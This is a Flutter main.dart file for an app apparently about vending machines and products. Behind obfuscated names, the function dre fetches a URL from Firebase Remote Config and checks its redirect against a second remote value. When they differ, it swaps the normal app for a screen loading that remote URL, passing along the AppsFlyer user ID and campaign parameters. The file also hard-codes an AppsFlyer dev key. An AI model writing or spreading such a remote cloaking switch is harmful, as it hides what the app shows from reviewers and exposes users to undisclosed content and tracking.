import 'dart:io';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/models/machine.dart';
import 'core/models/product.dart';
import 'features/home/pages/firebase_options.dart';
import 'features/home/pages/settings_page.dart';
import 'features/machine/bloc/machine_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String apsss = '';
String cancelation = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String campaignId = '';
String campx = '';

Future<void> initializeApp() async {
  await Hive.initFlutter();
  Hive.registerAdapter(MachineAdapter());
  Hive.registerAdapter(ProductAdapter());
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await mndjknaskdnaskd();
}

Future<void> mndjknaskdnaskd() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'QLe487x7eRdgQRRcUCn3w6',
    appId: '6651850766',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelation = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
    campaignId = res['campaign_id'] ?? '';
    campx = res['campaign'] ?? '';
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    campaignId = res['payload']['campaign_id'] ?? '';
    campx = res['payload']['campaign'] ?? '';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    _deepLinkData = dp.toJson();
    campaignId = dp.deepLink?.campaignId ?? '';
    campx = dp.deepLink?.campaign ?? '';
  });

  apsss = await _appsflyerSdk.getAppsFlyerUID() ?? '';

  _appsflyerSdk.startSDK();
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Hive.initFlutter();
  Hive.registerAdapter(MachineAdapter());
  Hive.registerAdapter(ProductAdapter());

  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await mndjknaskdnaskd();
  runApp(const MyApp());
}

String mkldas = '';
Future<bool> dre() async {
  final nfjksdkjasd = FirebaseRemoteConfig.instance;
  await nfjksdkjasd.fetchAndActivate();
  mndjknaskdnaskd();
  String dsdfdsfgdg = nfjksdkjasd.getString('dre');
  String cdsfgsdx = nfjksdkjasd.getString('dredd');
  if (!dsdfdsfgdg.contains('none')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      mkldas = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('none') ? false : true;
}

Future<void> getTrack() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
      future: dre(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return MaterialApp(
            debugShowCheckedModeBanner: false,
            home: Container(
              color: Colors.white,
              child: const Center(
                child: CupertinoActivityIndicator(),
              ),
            ),
          );
        } else {
          if (snapshot.data == true && mkldas != '') {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: Scnren(
                njfkds: mkldas,
                njfkads: apsss,
                mkda: cancelation,
                campaignId: campaignId,
                campx: campx,
              ),
            );
          } else {
            return MultiBlocProvider(
              providers: [
                BlocProvider(create: (context) => MachineBloc()),
              ],
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              ),
            );
          }
        }
      },
    );
  }
}
